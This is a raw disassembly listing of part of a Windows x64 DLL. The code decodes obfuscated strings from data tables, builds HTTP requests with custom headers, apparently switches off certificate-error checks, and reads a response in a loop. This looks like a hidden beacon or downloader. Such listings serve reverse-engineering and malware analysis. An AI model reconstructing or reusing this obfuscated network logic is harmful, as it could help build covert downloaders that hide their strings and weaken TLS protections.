   180001745:	41 83 c8 ff          	or     $0xffffffff,%r8d
   180001749:	48 8b cd             	mov    %rbp,%rcx
   18000174c:	ff 15 16 2c 01 00    	call   *0x12c16(%rip)        # 0x180014368
   180001752:	b9 27 00 00 00       	mov    $0x27,%ecx
   180001757:	e8 78 24 00 00       	call   0x180003bd4
   18000175c:	4c 8b c0             	mov    %rax,%r8
   18000175f:	48 8b f8             	mov    %rax,%rdi
   180001762:	33 c0                	xor    %eax,%eax
   180001764:	b9 27 00 00 00       	mov    $0x27,%ecx
   180001769:	f3 aa                	rep stos %al,(%rdi)
   18000176b:	49 8b f8             	mov    %r8,%rdi
   18000176e:	48 8b d3             	mov    %rbx,%rdx
   180001771:	42 0f b6 8c 3a d0 fb 	movzbl 0x1fbd0(%rdx,%r15,1),%ecx
   180001778:	01 00 
   18000177a:	48 83 c2 03          	add    $0x3,%rdx
   18000177e:	88 0f                	mov    %cl,(%rdi)
   180001780:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001784:	48 83 fa 72          	cmp    $0x72,%rdx
   180001788:	7c e7                	jl     0x180001771
   18000178a:	49 8b d0             	mov    %r8,%rdx
   18000178d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180001792:	e8 99 07 00 00       	call   0x180001f30
   180001797:	41 b9 00 00 00 20    	mov    $0x20000000,%r9d
   18000179d:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800017a2:	41 83 c8 ff          	or     $0xffffffff,%r8d
   1800017a6:	48 8b cd             	mov    %rbp,%rcx
   1800017a9:	ff 15 b9 2b 01 00    	call   *0x12bb9(%rip)        # 0x180014368
   1800017af:	b9 12 00 00 00       	mov    $0x12,%ecx
   1800017b4:	e8 1b 24 00 00       	call   0x180003bd4
   1800017b9:	4c 8b c0             	mov    %rax,%r8
   1800017bc:	48 8b f8             	mov    %rax,%rdi
   1800017bf:	33 c0                	xor    %eax,%eax
   1800017c1:	b9 12 00 00 00       	mov    $0x12,%ecx
   1800017c6:	f3 aa                	rep stos %al,(%rdi)
   1800017c8:	49 8b d0             	mov    %r8,%rdx
   1800017cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800017d0:	42 0f b6 8c 3b d8 fc 	movzbl 0x1fcd8(%rbx,%r15,1),%ecx
   1800017d7:	01 00 
   1800017d9:	48 83 c3 03          	add    $0x3,%rbx
   1800017dd:	88 0a                	mov    %cl,(%rdx)
   1800017df:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   1800017e3:	48 83 fb 33          	cmp    $0x33,%rbx
   1800017e7:	7c e7                	jl     0x1800017d0
   1800017e9:	4c 8d 8c 24 60 01 00 	lea    0x160(%rsp),%r9
   1800017f0:	00 
   1800017f1:	48 8d 15 b8 a6 01 00 	lea    0x1a6b8(%rip),%rdx        # 0x18001beb0
   1800017f8:	48 8d 8c 24 70 02 00 	lea    0x270(%rsp),%rcx
   1800017ff:	00 
   180001800:	e8 2b 07 00 00       	call   0x180001f30
   180001805:	41 b9 00 00 00 20    	mov    $0x20000000,%r9d
   18000180b:	48 8d 94 24 70 02 00 	lea    0x270(%rsp),%rdx
   180001812:	00 
   180001813:	41 83 c8 ff          	or     $0xffffffff,%r8d
   180001817:	48 8b cd             	mov    %rbp,%rcx
   18000181a:	ff 15 48 2b 01 00    	call   *0x12b48(%rip)        # 0x180014368
   180001820:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   180001825:	c7 44 24 48 04 00 00 	movl   $0x4,0x48(%rsp)
   18000182c:	00 
   18000182d:	4c 8d 44 24 44       	lea    0x44(%rsp),%r8
   180001832:	ba 1f 00 00 00       	mov    $0x1f,%edx
   180001837:	48 8b cd             	mov    %rbp,%rcx
   18000183a:	ff 15 40 2b 01 00    	call   *0x12b40(%rip)        # 0x180014380
   180001840:	81 4c 24 44 80 01 00 	orl    $0x180,0x44(%rsp)
   180001847:	00 
   180001848:	4c 8d 44 24 44       	lea    0x44(%rsp),%r8
   18000184d:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180001853:	48 8b cd             	mov    %rbp,%rcx
   180001856:	41 8d 51 1b          	lea    0x1b(%r9),%edx
   18000185a:	ff 15 28 2b 01 00    	call   *0x12b28(%rip)        # 0x180014388
   180001860:	b9 40 00 00 00       	mov    $0x40,%ecx
   180001865:	e8 6a 23 00 00       	call   0x180003bd4
   18000186a:	48 8b f8             	mov    %rax,%rdi
   18000186d:	b9 40 00 00 00       	mov    $0x40,%ecx
   180001872:	33 c0                	xor    %eax,%eax
   180001874:	4d 8b cd             	mov    %r13,%r9
   180001877:	f3 aa                	rep stos %al,(%rdi)
   180001879:	8b 44 24 40          	mov    0x40(%rsp),%eax
   18000187d:	48 8b cd             	mov    %rbp,%rcx
   180001880:	45 33 c0             	xor    %r8d,%r8d
   180001883:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180001887:	33 d2                	xor    %edx,%edx
   180001889:	ff 15 c1 2a 01 00    	call   *0x12ac1(%rip)        # 0x180014350
   18000188f:	85 c0                	test   %eax,%eax
   180001891:	75 1b                	jne    0x1800018ae
   180001893:	48 8b cd             	mov    %rbp,%rcx
   180001896:	ff 15 bc 2a 01 00    	call   *0x12abc(%rip)        # 0x180014358
   18000189c:	49 8b ce             	mov    %r14,%rcx
   18000189f:	ff 15 b3 2a 01 00    	call   *0x12ab3(%rip)        # 0x180014358
   1800018a5:	48 8b ce             	mov    %rsi,%rcx
   1800018a8:	ff 15 aa 2a 01 00    	call   *0x12aaa(%rip)        # 0x180014358
   1800018ae:	4c 8b b4 24 98 03 00 	mov    0x398(%rsp),%r14
   1800018b5:	00 
   1800018b6:	33 c0                	xor    %eax,%eax
   1800018b8:	48 8b 8c 24 80 03 00 	mov    0x380(%rsp),%rcx
   1800018bf:	00 
   1800018c0:	48 33 cc             	xor    %rsp,%rcx
   1800018c3:	e8 e8 22 00 00       	call   0x180003bb0
   1800018c8:	48 81 c4 a0 03 00 00 	add    $0x3a0,%rsp
   1800018cf:	41 5f                	pop    %r15
   1800018d1:	41 5d                	pop    %r13
   1800018d3:	41 5c                	pop    %r12
   1800018d5:	5f                   	pop    %rdi
   1800018d6:	5e                   	pop    %rsi
   1800018d7:	5d                   	pop    %rbp
   1800018d8:	5b                   	pop    %rbx
   1800018d9:	c3                   	ret
   1800018da:	eb dc                	jmp    0x1800018b8
   1800018dc:	cc                   	int3
   1800018dd:	cc                   	int3
   1800018de:	cc                   	int3
   1800018df:	cc                   	int3
   1800018e0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800018e5:	55                   	push   %rbp
   1800018e6:	57                   	push   %rdi
   1800018e7:	41 55                	push   %r13
   1800018e9:	41 56                	push   %r14
   1800018eb:	41 57                	push   %r15
   1800018ed:	48 8d ac 24 70 fd ff 	lea    -0x290(%rsp),%rbp
   1800018f4:	ff 
   1800018f5:	48 81 ec 90 03 00 00 	sub    $0x390,%rsp
   1800018fc:	48 8b 05 05 d7 01 00 	mov    0x1d705(%rip),%rax        # 0x18001f008
   180001903:	48 33 c4             	xor    %rsp,%rax
   180001906:	48 89 85 80 02 00 00 	mov    %rax,0x280(%rbp)
   18000190d:	b9 40 00 00 00       	mov    $0x40,%ecx
   180001912:	e8 bd 22 00 00       	call   0x180003bd4
   180001917:	4c 8b e8             	mov    %rax,%r13
   18000191a:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   18000191f:	33 c0                	xor    %eax,%eax
   180001921:	b9 04 01 00 00       	mov    $0x104,%ecx
   180001926:	f3 aa                	rep stos %al,(%rdi)
   180001928:	8d 50 40             	lea    0x40(%rax),%edx
   18000192b:	49 8b cd             	mov    %r13,%rcx
   18000192e:	ff 15 dc 26 01 00    	call   *0x126dc(%rip)        # 0x180014010
   180001934:	b9 8b 00 00 00       	mov    $0x8b,%ecx
   180001939:	e8 96 22 00 00       	call   0x180003bd4
   18000193e:	4c 8b d0             	mov    %rax,%r10
   180001941:	4c 8d 35 b8 e6 ff ff 	lea    -0x1948(%rip),%r14        # 0x180000000
   180001948:	48 8b f8             	mov    %rax,%rdi
   18000194b:	b9 8b 00 00 00       	mov    $0x8b,%ecx
   180001950:	33 c0                	xor    %eax,%eax
   180001952:	49 8b d2             	mov    %r10,%rdx
   180001955:	f3 aa                	rep stos %al,(%rdi)
   180001957:	33 db                	xor    %ebx,%ebx
   180001959:	8b cb                	mov    %ebx,%ecx
   18000195b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001960:	42 0f b6 84 31 60 ff 	movzbl 0x1ff60(%rcx,%r14,1),%eax
   180001967:	01 00 
   180001969:	48 83 c1 03          	add    $0x3,%rcx
   18000196d:	88 02                	mov    %al,(%rdx)
   18000196f:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   180001973:	48 81 f9 9e 01 00 00 	cmp    $0x19e,%rcx
   18000197a:	7c e4                	jl     0x180001960
   18000197c:	48 89 b4 24 c0 03 00 	mov    %rsi,0x3c0(%rsp)
   180001983:	00 
   180001984:	45 33 c9             	xor    %r9d,%r9d
   180001987:	45 33 c0             	xor    %r8d,%r8d
   18000198a:	4c 89 a4 24 c8 03 00 	mov    %r12,0x3c8(%rsp)
   180001991:	00 
   180001992:	33 d2                	xor    %edx,%edx
   180001994:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   180001998:	49 8b ca             	mov    %r10,%rcx
   18000199b:	ff 15 f7 29 01 00    	call   *0x129f7(%rip)        # 0x180014398
   1800019a1:	4c 8b f8             	mov    %rax,%r15
   1800019a4:	48 85 c0             	test   %rax,%rax
   1800019a7:	0f 84 46 05 00 00    	je     0x180001ef3
   1800019ad:	b9 10 00 00 00       	mov    $0x10,%ecx
   1800019b2:	e8 1d 22 00 00       	call   0x180003bd4
   1800019b7:	4c 8b d0             	mov    %rax,%r10
   1800019ba:	48 8b f8             	mov    %rax,%rdi
   1800019bd:	33 c0                	xor    %eax,%eax
   1800019bf:	b9 10 00 00 00       	mov    $0x10,%ecx
   1800019c4:	f3 aa                	rep stos %al,(%rdi)
   1800019c6:	49 8b fa             	mov    %r10,%rdi
   1800019c9:	48 8b d3             	mov    %rbx,%rdx
   1800019cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1800019d0:	42 0f b6 8c 32 18 fb 	movzbl 0x1fb18(%rdx,%r14,1),%ecx
   1800019d7:	01 00 
   1800019d9:	48 83 c2 03          	add    $0x3,%rdx
   1800019dd:	88 0f                	mov    %cl,(%rdi)
   1800019df:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   1800019e3:	48 83 fa 2d          	cmp    $0x2d,%rdx
   1800019e7:	7c e7                	jl     0x1800019d0
   1800019e9:	44 0f b7 05 53 e0 01 	movzwl 0x1e053(%rip),%r8d        # 0x18001fa44
   1800019f0:	00 
   1800019f1:	45 33 c9             	xor    %r9d,%r9d
   1800019f4:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1800019f9:	49 8b d2             	mov    %r10,%rdx
   1800019fc:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180001a00:	49 8b cf             	mov    %r15,%rcx
   180001a03:	c7 44 24 28 03 00 00 	movl   $0x3,0x28(%rsp)
   180001a0a:	00 
   180001a0b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180001a10:	ff 15 4a 29 01 00    	call   *0x1294a(%rip)        # 0x180014360
   180001a16:	4c 8b e0             	mov    %rax,%r12
   180001a19:	48 85 c0             	test   %rax,%rax
   180001a1c:	0f 84 c8 04 00 00    	je     0x180001eea
   180001a22:	b9 0e 00 00 00       	mov    $0xe,%ecx
   180001a27:	e8 a8 21 00 00       	call   0x180003bd4
   180001a2c:	48 8b f0             	mov    %rax,%rsi
   180001a2f:	48 8b f8             	mov    %rax,%rdi
   180001a32:	33 c0                	xor    %eax,%eax
   180001a34:	b9 0e 00 00 00       	mov    $0xe,%ecx
   180001a39:	f3 aa                	rep stos %al,(%rdi)
   180001a3b:	48 8b fe             	mov    %rsi,%rdi
   180001a3e:	48 8b d3             	mov    %rbx,%rdx
   180001a41:	42 0f b6 8c 32 48 fa 	movzbl 0x1fa48(%rdx,%r14,1),%ecx
   180001a48:	01 00 
   180001a4a:	48 83 c2 03          	add    $0x3,%rdx
   180001a4e:	88 0f                	mov    %cl,(%rdi)
   180001a50:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001a54:	48 83 fa 27          	cmp    $0x27,%rdx
   180001a58:	7c e7                	jl     0x180001a41
   180001a5a:	b9 05 00 00 00       	mov    $0x5,%ecx
   180001a5f:	e8 70 21 00 00       	call   0x180003bd4
   180001a64:	4c 8b d0             	mov    %rax,%r10
   180001a67:	48 8b f8             	mov    %rax,%rdi
   180001a6a:	33 c0                	xor    %eax,%eax
   180001a6c:	b9 05 00 00 00       	mov    $0x5,%ecx
   180001a71:	f3 aa                	rep stos %al,(%rdi)
   180001a73:	49 8b fa             	mov    %r10,%rdi
   180001a76:	48 8b d3             	mov    %rbx,%rdx
   180001a79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001a80:	42 0f b6 8c 32 88 01 	movzbl 0x20188(%rdx,%r14,1),%ecx
   180001a87:	02 00 
   180001a89:	48 83 c2 03          	add    $0x3,%rdx
   180001a8d:	88 0f                	mov    %cl,(%rdi)
   180001a8f:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001a93:	48 83 fa 0c          	cmp    $0xc,%rdx
   180001a97:	7c e7                	jl     0x180001a80
   180001a99:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180001a9e:	45 33 c9             	xor    %r9d,%r9d
   180001aa1:	c7 44 24 30 00 00 80 	movl   $0x800000,0x30(%rsp)
   180001aa8:	00 
   180001aa9:	4c 8b c6             	mov    %rsi,%r8
   180001aac:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   180001ab1:	49 8b d2             	mov    %r10,%rdx
   180001ab4:	49 8b cc             	mov    %r12,%rcx
   180001ab7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180001abc:	ff 15 ae 28 01 00    	call   *0x128ae(%rip)        # 0x180014370
   180001ac2:	48 8b f0             	mov    %rax,%rsi
   180001ac5:	48 85 c0             	test   %rax,%rax
   180001ac8:	0f 84 13 04 00 00    	je     0x180001ee1
   180001ace:	4d 8b c5             	mov    %r13,%r8
   180001ad1:	48 8d 15 e0 a3 01 00 	lea    0x1a3e0(%rip),%rdx        # 0x18001beb8
   180001ad8:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180001add:	e8 4e 04 00 00       	call   0x180001f30
   180001ae2:	b9 38 00 00 00       	mov    $0x38,%ecx
   180001ae7:	e8 e8 20 00 00       	call   0x180003bd4
   180001aec:	4c 8b c8             	mov    %rax,%r9
   180001aef:	48 8b f8             	mov    %rax,%rdi
   180001af2:	33 c0                	xor    %eax,%eax
   180001af4:	b9 38 00 00 00       	mov    $0x38,%ecx
   180001af9:	f3 aa                	rep stos %al,(%rdi)
   180001afb:	49 8b f9             	mov    %r9,%rdi
   180001afe:	48 8b d3             	mov    %rbx,%rdx
   180001b01:	42 0f b6 8c 32 70 fa 	movzbl 0x1fa70(%rdx,%r14,1),%ecx
   180001b08:	01 00 
   180001b0a:	48 83 c2 03          	add    $0x3,%rdx
   180001b0e:	88 0f                	mov    %cl,(%rdi)
   180001b10:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001b14:	48 81 fa a5 00 00 00 	cmp    $0xa5,%rdx
   180001b1b:	7c e4                	jl     0x180001b01
   180001b1d:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   180001b22:	49 8b d1             	mov    %r9,%rdx
   180001b25:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180001b2a:	e8 01 04 00 00       	call   0x180001f30
   180001b2f:	b9 10 00 00 00       	mov    $0x10,%ecx
   180001b34:	e8 9b 20 00 00       	call   0x180003bd4
   180001b39:	4c 8b c8             	mov    %rax,%r9
   180001b3c:	48 8b f8             	mov    %rax,%rdi
   180001b3f:	33 c0                	xor    %eax,%eax
   180001b41:	b9 10 00 00 00       	mov    $0x10,%ecx
   180001b46:	f3 aa                	rep stos %al,(%rdi)
   180001b48:	49 8b f9             	mov    %r9,%rdi
   180001b4b:	48 8b d3             	mov    %rbx,%rdx
   180001b4e:	66 90                	xchg   %ax,%ax
   180001b50:	42 0f b6 8c 32 48 fc 	movzbl 0x1fc48(%rdx,%r14,1),%ecx
   180001b57:	01 00 
   180001b59:	48 83 c2 03          	add    $0x3,%rdx
   180001b5d:	88 0f                	mov    %cl,(%rdi)
   180001b5f:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001b63:	48 83 fa 2d          	cmp    $0x2d,%rdx
   180001b67:	7c e7                	jl     0x180001b50
   180001b69:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   180001b6e:	49 8b d1             	mov    %r9,%rdx
   180001b71:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180001b76:	e8 b5 03 00 00       	call   0x180001f30
   180001b7b:	4d 8b cd             	mov    %r13,%r9
   180001b7e:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   180001b83:	48 8d 15 36 a3 01 00 	lea    0x1a336(%rip),%rdx        # 0x18001bec0
   180001b8a:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180001b8f:	e8 9c 03 00 00       	call   0x180001f30
   180001b94:	b9 3b 00 00 00       	mov    $0x3b,%ecx
   180001b99:	e8 36 20 00 00       	call   0x180003bd4
   180001b9e:	4c 8b c8             	mov    %rax,%r9
   180001ba1:	48 8b f8             	mov    %rax,%rdi
   180001ba4:	33 c0                	xor    %eax,%eax
   180001ba6:	b9 3b 00 00 00       	mov    $0x3b,%ecx
   180001bab:	f3 aa                	rep stos %al,(%rdi)
   180001bad:	49 8b f9             	mov    %r9,%rdi
   180001bb0:	48 8b d3             	mov    %rbx,%rdx
   180001bb3:	0f 1f 40 00          	nopl   0x0(%rax)
   180001bb7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180001bbe:	00 00 
   180001bc0:	42 0f b6 8c 32 20 fe 	movzbl 0x1fe20(%rdx,%r14,1),%ecx
   180001bc7:	01 00 
   180001bc9:	48 83 c2 03          	add    $0x3,%rdx
   180001bcd:	88 0f                	mov    %cl,(%rdi)
   180001bcf:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001bd3:	48 81 fa ae 00 00 00 	cmp    $0xae,%rdx
   180001bda:	7c e4                	jl     0x180001bc0
   180001bdc:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   180001be1:	49 8b d1             	mov    %r9,%rdx
   180001be4:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180001be9:	e8 42 03 00 00       	call   0x180001f30
   180001bee:	b9 41 00 00 00       	mov    $0x41,%ecx
   180001bf3:	e8 dc 1f 00 00       	call   0x180003bd4
   180001bf8:	4c 8b c8             	mov    %rax,%r9
   180001bfb:	48 8b f8             	mov    %rax,%rdi
   180001bfe:	33 c0                	xor    %eax,%eax
   180001c00:	b9 41 00 00 00       	mov    $0x41,%ecx
   180001c05:	f3 aa                	rep stos %al,(%rdi)
   180001c07:	49 8b f9             	mov    %r9,%rdi
   180001c0a:	48 8b d3             	mov    %rbx,%rdx
   180001c0d:	0f 1f 00             	nopl   (%rax)
   180001c10:	42 0f b6 8c 32 10 fd 	movzbl 0x1fd10(%rdx,%r14,1),%ecx
   180001c17:	01 00 
   180001c19:	48 83 c2 03          	add    $0x3,%rdx
   180001c1d:	88 0f                	mov    %cl,(%rdi)
   180001c1f:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001c23:	48 81 fa c0 00 00 00 	cmp    $0xc0,%rdx
   180001c2a:	7c e4                	jl     0x180001c10
   180001c2c:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   180001c31:	48 8d 15 94 a2 01 00 	lea    0x1a294(%rip),%rdx        # 0x18001becc
   180001c38:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180001c3d:	e8 ee 02 00 00       	call   0x180001f30
   180001c42:	4d 8b cd             	mov    %r13,%r9
   180001c45:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   180001c4a:	48 8d 15 87 a2 01 00 	lea    0x1a287(%rip),%rdx        # 0x18001bed8
   180001c51:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180001c56:	e8 d5 02 00 00       	call   0x180001f30
   180001c5b:	33 c0                	xor    %eax,%eax
   180001c5d:	48 8d 7d 60          	lea    0x60(%rbp),%rdi
   180001c61:	b9 04 01 00 00       	mov    $0x104,%ecx
   180001c66:	f3 aa                	rep stos %al,(%rdi)
   180001c68:	8d 48 2d             	lea    0x2d(%rax),%ecx
   180001c6b:	e8 64 1f 00 00       	call   0x180003bd4
   180001c70:	4c 8b f0             	mov    %rax,%r14
   180001c73:	48 8b f8             	mov    %rax,%rdi
   180001c76:	33 c0                	xor    %eax,%eax
   180001c78:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   180001c7d:	f3 aa                	rep stos %al,(%rdi)
   180001c7f:	49 8b fe             	mov    %r14,%rdi
   180001c82:	48 8d 05 77 e3 ff ff 	lea    -0x1c89(%rip),%rax        # 0x180000000
   180001c89:	48 8b d3             	mov    %rbx,%rdx
   180001c8c:	0f 1f 40 00          	nopl   0x0(%rax)
   180001c90:	0f b6 8c 02 d0 fe 01 	movzbl 0x1fed0(%rdx,%rax,1),%ecx
   180001c97:	00 
   180001c98:	48 83 c2 03          	add    $0x3,%rdx
   180001c9c:	88 0f                	mov    %cl,(%rdi)
   180001c9e:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001ca2:	48 81 fa 84 00 00 00 	cmp    $0x84,%rdx
   180001ca9:	7c e5                	jl     0x180001c90
   180001cab:	b9 1a 00 00 00       	mov    $0x1a,%ecx
   180001cb0:	e8 1f 1f 00 00       	call   0x180003bd4
   180001cb5:	4c 8b c8             	mov    %rax,%r9
   180001cb8:	48 8b f8             	mov    %rax,%rdi
   180001cbb:	33 c0                	xor    %eax,%eax
   180001cbd:	b9 1a 00 00 00       	mov    $0x1a,%ecx
   180001cc2:	f3 aa                	rep stos %al,(%rdi)
   180001cc4:	49 8b f9             	mov    %r9,%rdi
   180001cc7:	48 8d 05 32 e3 ff ff 	lea    -0x1cce(%rip),%rax        # 0x180000000
   180001cce:	48 8b d3             	mov    %rbx,%rdx
   180001cd1:	0f b6 8c 02 d0 fd 01 	movzbl 0x1fdd0(%rdx,%rax,1),%ecx
   180001cd8:	00 
   180001cd9:	48 83 c2 03          	add    $0x3,%rdx
   180001cdd:	88 0f                	mov    %cl,(%rdi)
   180001cdf:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001ce3:	48 83 fa 4b          	cmp    $0x4b,%rdx
   180001ce7:	7c e8                	jl     0x180001cd1
   180001ce9:	4d 8b c6             	mov    %r14,%r8
   180001cec:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   180001cf0:	49 8b d1             	mov    %r9,%rdx
   180001cf3:	e8 38 02 00 00       	call   0x180001f30
   180001cf8:	41 b9 00 00 00 20    	mov    $0x20000000,%r9d
   180001cfe:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   180001d02:	41 83 c8 ff          	or     $0xffffffff,%r8d
   180001d06:	48 8b ce             	mov    %rsi,%rcx
   180001d09:	ff 15 59 26 01 00    	call   *0x12659(%rip)        # 0x180014368
   180001d0f:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   180001d14:	e8 bb 1e 00 00       	call   0x180003bd4
   180001d19:	4c 8b c0             	mov    %rax,%r8
   180001d1c:	48 8b f8             	mov    %rax,%rdi
   180001d1f:	33 c0                	xor    %eax,%eax
   180001d21:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   180001d26:	f3 aa                	rep stos %al,(%rdi)
   180001d28:	49 8b f8             	mov    %r8,%rdi
   180001d2b:	48 8d 05 ce e2 ff ff 	lea    -0x1d32(%rip),%rax        # 0x180000000
   180001d32:	48 8b d3             	mov    %rbx,%rdx
   180001d35:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   180001d3c:	00 00 00 00 
   180001d40:	0f b6 8c 02 00 01 02 	movzbl 0x20100(%rdx,%rax,1),%ecx
   180001d47:	00 
   180001d48:	48 83 c2 03          	add    $0x3,%rdx
   180001d4c:	88 0f                	mov    %cl,(%rdi)
   180001d4e:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001d52:	48 81 fa 84 00 00 00 	cmp    $0x84,%rdx
   180001d59:	7c e5                	jl     0x180001d40
   180001d5b:	4d 8b cd             	mov    %r13,%r9
   180001d5e:	48 8d 15 83 a1 01 00 	lea    0x1a183(%rip),%rdx        # 0x18001bee8
   180001d65:	48 8d 8d 70 01 00 00 	lea    0x170(%rbp),%rcx
   180001d6c:	e8 bf 01 00 00       	call   0x180001f30
   180001d71:	41 b9 00 00 00 20    	mov    $0x20000000,%r9d
   180001d77:	48 8d 95 70 01 00 00 	lea    0x170(%rbp),%rdx
   180001d7e:	41 83 c8 ff          	or     $0xffffffff,%r8d
   180001d82:	48 8b ce             	mov    %rsi,%rcx
   180001d85:	ff 15 dd 25 01 00    	call   *0x125dd(%rip)        # 0x180014368
   180001d8b:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   180001d90:	c7 44 24 48 04 00 00 	movl   $0x4,0x48(%rsp)
   180001d97:	00 
   180001d98:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   180001d9d:	ba 1f 00 00 00       	mov    $0x1f,%edx
   180001da2:	48 8b ce             	mov    %rsi,%rcx
   180001da5:	ff 15 d5 25 01 00    	call   *0x125d5(%rip)        # 0x180014380
   180001dab:	81 4c 24 40 80 01 00 	orl    $0x180,0x40(%rsp)
   180001db2:	00 
   180001db3:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   180001db8:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180001dbe:	48 8b ce             	mov    %rsi,%rcx
   180001dc1:	41 8d 51 1b          	lea    0x1b(%r9),%edx
   180001dc5:	ff 15 bd 25 01 00    	call   *0x125bd(%rip)        # 0x180014388
   180001dcb:	b9 40 00 00 00       	mov    $0x40,%ecx
   180001dd0:	e8 ff 1d 00 00       	call   0x180003bd4
   180001dd5:	48 8b f8             	mov    %rax,%rdi
   180001dd8:	4c 8b f0             	mov    %rax,%r14
   180001ddb:	33 c0                	xor    %eax,%eax
   180001ddd:	b9 40 00 00 00       	mov    $0x40,%ecx
   180001de2:	f3 aa                	rep stos %al,(%rdi)
   180001de4:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180001de9:	c7 44 24 4c 40 00 00 	movl   $0x40,0x4c(%rsp)
   180001df0:	00 
   180001df1:	ba 04 01 00 00       	mov    $0x104,%edx
   180001df6:	e8 b5 5b 00 00       	call   0x1800079b0
   180001dfb:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   180001e00:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180001e04:	45 33 c0             	xor    %r8d,%r8d
   180001e07:	33 d2                	xor    %edx,%edx
   180001e09:	48 8b ce             	mov    %rsi,%rcx
   180001e0c:	ff 15 3e 25 01 00    	call   *0x1253e(%rip)        # 0x180014350
   180001e12:	48 8b ce             	mov    %rsi,%rcx
   180001e15:	85 c0                	test   %eax,%eax
   180001e17:	0f 84 be 00 00 00    	je     0x180001edb
   180001e1d:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   180001e22:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180001e27:	4d 8b c6             	mov    %r14,%r8
   180001e2a:	ba 05 00 00 00       	mov    $0x5,%edx
   180001e2f:	ff 15 43 25 01 00    	call   *0x12543(%rip)        # 0x180014378
   180001e35:	49 8b ce             	mov    %r14,%rcx
   180001e38:	44 8b e8             	mov    %eax,%r13d
   180001e3b:	e8 44 5b 00 00       	call   0x180007984
   180001e40:	49 8b ce             	mov    %r14,%rcx
   180001e43:	8b f8                	mov    %eax,%edi
   180001e45:	e8 f6 57 00 00       	call   0x180007640
   180001e4a:	85 ff                	test   %edi,%edi
   180001e4c:	0f 84 86 00 00 00    	je     0x180001ed8
   180001e52:	45 85 ed             	test   %r13d,%r13d
   180001e55:	0f 84 7d 00 00 00    	je     0x180001ed8
   180001e5b:	8b cf                	mov    %edi,%ecx
   180001e5d:	89 5c 24 44          	mov    %ebx,0x44(%rsp)
   180001e61:	e8 6e 1d 00 00       	call   0x180003bd4
   180001e66:	4c 8b f0             	mov    %rax,%r14
   180001e69:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001e70:	8b d3                	mov    %ebx,%edx
   180001e72:	4c 8d 4c 24 44       	lea    0x44(%rsp),%r9
   180001e77:	49 03 d6             	add    %r14,%rdx
   180001e7a:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   180001e80:	48 8b ce             	mov    %rsi,%rcx
   180001e83:	ff 15 07 25 01 00    	call   *0x12507(%rip)        # 0x180014390
   180001e89:	03 5c 24 44          	add    0x44(%rsp),%ebx
   180001e8d:	2b 7c 24 44          	sub    0x44(%rsp),%edi
   180001e91:	75 dd                	jne    0x180001e70
   180001e93:	48 8b ce             	mov    %rsi,%rcx
   180001e96:	ff 15 bc 24 01 00    	call   *0x124bc(%rip)        # 0x180014358
   180001e9c:	49 8b cc             	mov    %r12,%rcx
   180001e9f:	ff 15 b3 24 01 00    	call   *0x124b3(%rip)        # 0x180014358
   180001ea5:	49 8b cf             	mov    %r15,%rcx
   180001ea8:	ff 15 aa 24 01 00    	call   *0x124aa(%rip)        # 0x180014358
